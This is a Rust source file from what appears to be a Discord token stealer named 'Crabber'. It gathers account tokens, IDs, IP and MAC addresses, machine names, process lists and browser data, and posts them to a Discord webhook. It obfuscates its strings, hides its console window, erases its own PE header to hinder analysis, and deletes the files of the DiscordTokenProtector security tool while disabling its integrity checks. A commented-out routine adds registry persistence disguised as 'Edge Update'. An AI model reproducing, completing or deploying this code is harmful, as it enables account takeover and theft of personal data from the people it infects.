use std::env;
use std::fs::File;
use std::io::{Read, Write};

use goldberg::goldberg_stmts;

use base64::Engine as _;
use reqwest::blocking::Client;
use reqwest::blocking::multipart::{Form, Part};
use std::io::Cursor;

use lazy_static::lazy_static;
use obfstr::obfstr as obf;

use serde_json::{Value, json};
use serde::{Serialize, Deserialize};

// Calling Var and Structs
use winapi::um::winbase::{STD_INPUT_HANDLE, STD_OUTPUT_HANDLE, STD_ERROR_HANDLE};
use winapi::shared::minwindef::{BOOL, DWORD};
use winapi::um::winnt::HANDLE;
use winapi::um::minwinbase::EXCEPTION_ACCESS_VIOLATION;

use crate::global::loader;
use crate::browser;

goldberg_stmts! {
    lazy_static! {
        pub static ref WEBHOOK_URL : String = obf!("WEBHOOK_HERE").to_string();
        pub static ref ROAMING : String = std::env!("APPDATA").to_string();
        pub static ref APPDATA : String = std::env!("LOCALAPPDATA").to_string();
    }
}

// Implement Default trait for Credentials
goldberg_stmts! {
    #[derive(Default, Debug)]
    pub struct Credentials {
        pub id: Vec<String>,
        pub token: Vec<String>,
        pub ip: String,
        pub mac: Vec<String>, 
        pub pc_name: String,
        pub pc_user: String,
        pub proc_list : Vec<String>,
        pub uuids : String,
        pub browsers : Vec<browser::utils::Browser>,
    }
}

fn erase_pe_header() {
    let oldpro: winapi::shared::minwindef::DWORD = 0;

    // Get base address of module
    let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();

    let getmodhandlea = loader::call_function!(&handle, fn(*const i8) -> HANDLE, obf!("GetModuleHandleA"));
    let base = getmodhandlea(0 as winapi::um::winnt::LPCSTR);

    // Change memory protection
    let virtprotect = loader::call_function!(&handle, fn(*mut winapi::ctypes::c_void, usize, winapi::shared::minwindef::DWORD, *mut winapi::shared::minwindef::DWORD) -> BOOL, obf!("VirtualProtect"));
    virtprotect(base as *mut winapi::ctypes::c_void, 4096, 4, oldpro as *mut winapi::shared::minwindef::DWORD);

    // Erase the header
    let zero_mem = loader::call_function!(&handle, fn(*mut winapi::ctypes::c_void, usize) -> (), obf!("RtlZeroMemory"));
    zero_mem(base as *mut winapi::ctypes::c_void, 4096);
}

pub fn prockill(pid : u32, signal : u32) -> i32 {
    let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let open_process = loader::call_function!(&handle, fn(DWORD, BOOL, DWORD) -> HANDLE, obf!("OpenProcess"));
    let terminate_process = loader::call_function!(&handle, fn(HANDLE, u32) -> BOOL, obf!("TerminateProcess"));
    let close_handle = loader::call_function!(&handle, fn(HANDLE) -> BOOL, obf!("CloseHandle"));
    
    let explorer = open_process(signal, 0, pid);
    let ret = terminate_process(explorer, 1);
    close_handle(explorer);
    return ret;
}

pub fn force_kill() {
    erase_pe_header();
    std::process::exit(0);
    prockill(std::process::id(), EXCEPTION_ACCESS_VIOLATION);
}

pub fn decode_base64(encoded: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    match base64::engine::general_purpose::STANDARD.decode(encoded) {
        Ok(decoded) => Ok(decoded.to_vec()),
        Err(err) => Err(Box::new(err) as Box<dyn std::error::Error>),
    }
}

pub fn u8_slice_to_u16_slice(slice: &[u8]) -> &[u16] {
    unsafe {
        std::slice::from_raw_parts(slice.as_ptr() as *const u16, slice.len() / 2)
    }
}

pub fn char_arr_to_string(chars  : &[i8]) -> String {
    chars.into_iter().map(|c| { *c as u8 as char }).collect()
}

pub fn hide_console_window() {
    let handle_1 = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let alloc_console = loader::call_function!(&handle_1, fn() -> BOOL, obf!("AllocConsole"));
    let free_console = loader::call_function!(&handle_1, fn() -> BOOL, obf!("FreeConsole"));
    let set_std_handle = loader::call_function!(&handle_1, fn(DWORD, HANDLE,) -> BOOL, obf!("SetStdHandle"));

    alloc_console();
    set_std_handle(STD_INPUT_HANDLE, std::ptr::null_mut());
    set_std_handle(STD_OUTPUT_HANDLE, std::ptr::null_mut());
    set_std_handle(STD_ERROR_HANDLE, std::ptr::null_mut());
    free_console();
}

pub fn remove_duplicates<T: Eq + std::hash::Hash + Clone>(vec: Vec<T>) -> Vec<T> {
    let mut result = Vec::new();
        
    vec.iter().for_each(|x| {
        if !result.contains(x) {
            result.push(x.clone());
        }
    });

    result
}

pub fn send_file_to_discord_webhook(file_content: &[u8], filename: &str, webhook_url: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();
    
    let file_part = Part::bytes(file_content.to_vec())
        .file_name(filename.to_owned())
        .mime_str("application/octet-stream")?;
    
    let form = Form::new().part("file", file_part);
    
    let _ = client.post(webhook_url)
        .multipart(form)
        .send()?;

    Ok(())
}

pub fn send_data(webhook_url: &str, data: &str) -> Result<u16, ()> {
    let parts: Vec<&str> = data.split("NOP").collect();
    println!("{:?}", parts);
    goldberg_stmts! {
        let payload = serde_json::json!({
            "username": obf!("Crabber"),
            "avatar_url": obf!("https://i.redd.it/bm6dj3i51gd71.png"),
            "embeds": [
                {
                    "title": obf!("Gotcha Custacean !"),
                    "color": 0xfc541c,
                    "fields": [
                        {
                            "name": obf!("Token's:"),
                            "value": format!("```md\n{}```",parts[0].trim()),

                        },
                        {
                            "name": obf!("Id's:"),
                            "value": format!("```md\n{}```",parts[1].trim()),
                        },
                        {
                            "name": obf!("Other Info:"),
                            "value": format!("```md\n{}```",parts[2].trim()),
                        },
                        {
                            "name": obf!("Note:"),
                            "value": obf!("Data in deflated_data.bin are compressed using deflate algorithm\n Please use inflate_data executable to decompress it"),
                        },
                    ],
                    "thumbnail": {
                        "url": obf!("https://user-images.githubusercontent.com/8974888/231858967-7c37bf1e-335b-4f5a-9760-da97be9f54bb.png")
                    },

                },
            ]

        });
    }

    let client = Client::new();
    let response = client.post(webhook_url)
        .header(obf!("Content-Type"), obf!("application/json"))
        .body(payload.to_string())
        .send();

    match response {
        Ok(response) => Ok(response.status().as_u16()),
        Err(_) => Err(()),
    }
}

// pub fn create_persistence() {
//     // cp current exe to Windwows
//     let cur_exe = env::current_exe().unwrap();
//     let dir = env::var(obf!("localappdata")).unwrap();

//     let infec_path = format!("{}\\Microsoft\\update.exe", dir);
//     std::fs::copy(cur_exe, &infec_path).unwrap();

//     // create registry key using winreg in Software\\Microsoft\\Windows\\CurrentVersion\\Run and val Windows Update
//     let hklm = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
//     let (key, _) = hklm.create_subkey(obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).unwrap();
//     key.set_value(obf!("Edge Update"), &infec_path).unwrap();    
// }

pub fn kill_protector() {
    let roaming = ROAMING.clone();
    let path : String = format!("{}{}", roaming, obf!("\\DiscordTokenProtector"));
    
    if !std::path::Path::new(&path).exists() {
        return;
    }

    let cfg = std::fs::read_to_string(path.clone() + obf!("\\config.json")).unwrap();


    for process in [obf!("\\DiscordTokenProtector.exe"), obf!("\\ProtectionPayload.dll"), obf!("\\secure.dat")] {
        // Clone the path to avoid moving it
        let file = path.clone() + process;
        if std::path::Path::new(&file).exists() {
            std::fs::remove_file(file).unwrap();
        }
    }

    if std::path::Path::new(&cfg).exists() {
        if let Ok(mut file) = File::open(&cfg) {
            let mut contents = String::new();
            if file.read_to_string(&mut contents).is_ok() {
                goldberg_stmts! {
                    if let Ok(mut item) = serde_json::from_str::<Value>(&contents) {
                        item[obf!("auto_start")] = json!(false);
                        item[obf!("auto_start_discord")] = json!(false);
                        item[obf!("integrity")] = json!(false);
                        item[obf!("integrity_allowbetterdiscord")] = json!(false);
                        item[obf!("integrity_checkexecutable")] = json!(false);
                        item[obf!("integrity_checkhash")] = json!(false);
                        item[obf!("integrity_checkmodule")] = json!(false);
                        item[obf!("integrity_checkscripts")] = json!(false);
                        item[obf!("integrity_checkresource")] = json!(false);
                        item[obf!("integrity_redownloadhashes")] = json!(false);
                        item[obf!("iterations_iv")] = json!(364);
                        item[obf!("iterations_key")] = json!(457);
                        item[obf!("version")] = json!(69420);
        
                        if let Ok(mut file) = File::create(cfg) {
                            let formatted_json = serde_json::to_string_pretty(&item).unwrap();
                            file.write_all(formatted_json.as_bytes()).unwrap();
                        }
                    }
                }
            }
        }
    }
}